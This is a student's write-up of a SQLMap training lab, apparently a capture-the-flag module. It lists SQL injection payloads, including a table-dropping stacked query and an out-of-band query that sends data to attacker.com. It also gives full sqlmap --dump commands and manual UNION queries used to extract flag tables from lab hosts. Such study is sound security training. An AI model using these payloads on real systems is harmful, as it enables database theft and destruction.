# Getting Started

## SQLMap Overview

This section covers how to install sqlmap and the different types of sql injection it allows you to use.

SQLMap covers:
Boolean-based blind SQL Injection
An example of this inject would be 
``` sql
AND 1=1
```

Error-based SQL Injection
An example of this injection would be 
``` sql
AND GTID_SUBSET(@@version,0)
```
This is the second fastest injection

UNION query-based
An example of this injection would be 
``` sql 
UNION ALL SELECT 1,@@version,3
```
This is the fastest and best injection

Stacked queries
An example of this 
``` sql
; DROP TABLE users
```

Time-based blind SQL Injection
Example 
``` sql 
AND 1=IF(2>1,SLEEP(5),0)
```

Inline queries
Example 
``` sql
SELECT (SELECT @@version) from
```

Out-of-band SQL Injection
Example 
``` sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## Getting Started with SQLMap

This section just covers how to use the help parameters in sqlmap and how to run a basic query.

## SQLMap Output Description

This section just covers the ourput of sqlmao after it is run.

# Building Attacks

## Running SQLMap on an HTTP Request

The best to run sql map is to copy the curl URL in Dev tools and paste it into the command line. Then just change curl to sqlmap.

For get parameters, that will likely be included in the URL. 

For post parameters, we can use the --data paramameter like `--data 'uid=1&name=test'`

If we need to use a full HTTP request. We can use the -r flag and provide a request a file. These full requests can usually be captured in applications like burp.

We can also add our on hand crafted SQLMap requests. For instance if our request needs to use a specific cookie we can use the --cookie parameter like `--cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` or we can use the -H/--header parameter like `-H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`

There are some other things they cover here like we can provide a request file in XML or JSON format, and that we can use a random agent if we desire.

The questions in this section are:

What's the contents of table flag2? (Case #2) 

For this one, we can run:
`sqlmap 'http://83.136.249.57:50029/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.249.57:50029/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://83.136.249.57:50029' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1'`

This identifies that the id parameter is vulnerable to a list of SQLi including union and that it has 9 columns.

Running the below command gave me the the database I was on.
``` SQL
id=1 UNION ALL SELECT NULL,NULL,NULL,database(),NULL,NULL,NULL,NULL,NULL-- -
```

This command gave me the tables in testdb
``` SQL
id=1 UNION ALL SELECT NULL,NULL,NULL,TABLE_NAME,TABLE_SCHEMA,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.TABLES where table_schema='testdb'-- -
```

This gave me the column names in flag2
``` SQL
id=1 UNION ALL SELECT NULL,NULL,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='flag2'-- -
```

This gave me the flag
``` SQL
id=1 UNION ALL SELECT NULL,NULL,id,content,NULL,NULL,NULL,NULL,NULL from flag2-- -
```

Apparently I could just run SQLMap with --dump --batch and this answer would have been shown automatically.

What's the contents of table flag3? (Case #3) 

Running the below command gets the answer because it runs a batch set of tests and dumps the output, so it automatically dumps the table of flag3
`sqlmap 'http://83.136.249.57:50029/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.249.57:50029/case3.php' -H 'Connection: keep-alive' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' --dump --batch`

What's the contents of table flag4? (Case #4) 

For this one, I needed to start Burp Suite and visit the web page to get the request. Then I copied that into a file and ran:
`sqlmap -r Case4Request.txt --batch --dump`

This got the answer.

## Handling SQLMap Errors

This section covers how to handle errors when trying to run SQLMap.

The first thing to do is add the  --parse-errors flag, which displays the DBMS errors as part of the run.

The -t flag stores all the traffic content to an output file.

The -v gives verbose output. For instance -v 6 prints all errors and full HTTP request to the terminal.

We can also use the --proxy parameter to route all the traffic through a proxy like burp.

## Attack Tuning

This section covers how to make SQLMap do more and fine tune it to be more likely to succeed.

The first thing we can do is increase the risk (1-3) and level (1-5).

To do this we can add the flag like --level=5 --risk=5

We can also use the -T flag to target a specific table like -T flag5

We can use the --dump flag to dump the results to a file, and --flush-session so it does not save the session variables.

We can add --prefix and --suffix to make sure our test string is wrapped in a specific string. 

The questions in this section are:

What's the contents of table flag5? (Case #5) 

To get the answer for this section we can run this test with a higher level and risk, but the hint also mentions using -T to specificy the table being tested.

`sqlmap 'http://83.136.251.235:53338/case5.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.235:53338/case5.php' -H 'Upgrade-Insecure-Requests: 1' --batch --dump --level=5 --risk=3 -T flag5 --no-cast --dump -D testdb --flush-session`

What's the contents of table flag6? (Case #6) 

The hint on this section says use '`)' as the prefix, so I just ran the SQLMap with that and --batch and --dump

`sqlmap 'http://83.136.251.235:53338/case6.php?col=id' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.235:53338/case6.php' -H 'Upgrade-Insecure-Requests: 1' --prefix '`)' --batch --dump`

What's the contents of table flag7? (Case #7) 

The hint on this one mentions counting the number of columns in the output and specifying it for SQLMap. Running the below gets the answer.
`sqlmap 'http://83.136.251.235:53338/case7.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.235:53338/case7.php' -H 'Upgrade-Insecure-Requests: 1' --union-cols=5 --batch --dump`

# Database Enumeration

## Database Enumeration

## Advanced Database Enumneration

# Advanced SQLMap Usage

## Bypasswing Web Application Protections

## OS Exploitations

# Skills Assessment

## Skills Assessment
